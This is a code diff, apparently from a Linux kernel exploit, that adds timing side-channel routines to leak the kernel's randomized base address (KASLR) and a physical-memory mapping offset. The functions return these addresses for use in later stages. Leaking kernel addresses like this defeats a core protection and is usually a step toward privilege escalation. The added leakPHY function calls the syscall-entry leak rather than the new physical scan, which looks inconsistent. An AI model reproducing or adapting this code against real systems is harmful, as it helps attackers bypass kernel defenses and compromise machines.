@@ -25,6 +25,33 @@ uint64_t sidechannel(uint64_t addr) {
   return c - a;
 }
 
+
+uint64_t leak_phy(void) 
+{
+    uint64_t data[ARR_SIZE_PHYS] = {0};
+    uint64_t min = ~0, addr = ~0;
+    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
+    {
+        for (uint64_t idx = 0; idx < ARR_SIZE_PHYS; idx++) 
+        {
+            uint64_t test = SCAN_START_PHYS + idx * STEP_PHYS;
+            syscall(104);
+            uint64_t time = sidechannel(test);
+            if (i >= DUMMY_ITERATIONS)
+                data[idx] += time;
+        }
+    }
+    for (int i = 0; i < ARR_SIZE_PHYS; i++)
+    {
+        data[i] /= ITERATIONS;
+        if (data[i] < min)
+        {
+            min = data[i];
+            addr = SCAN_START_PHYS + i * STEP_PHYS;
+        }
+    }
+    return addr;
+}
 uint64_t leak_syscall_entry(void) 
 {
     uint64_t data[ARR_SIZE] = {0};
@@ -56,7 +83,15 @@ uint64_t leak_syscall_entry(void)
     return addr;
 }
 
-int leakKASLR(void){
-    printf ("KASLR base %llx\n", leak_syscall_entry() - entry_SYSCALL_64_offset);
+size_t leakKASLR(size_t offset){
+    size_t val = leak_syscall_entry() - entry_SYSCALL_64_offset+offset;
+    printf ("KASLR base %llx\n", val);
+    return val;
+}
+
+size_t leakPHY(size_t offset){
+    size_t val =  leak_syscall_entry() - 0x100000000+offset;
+    printf ("KASLR base %llx\n",val);
+    return val;
 }
 
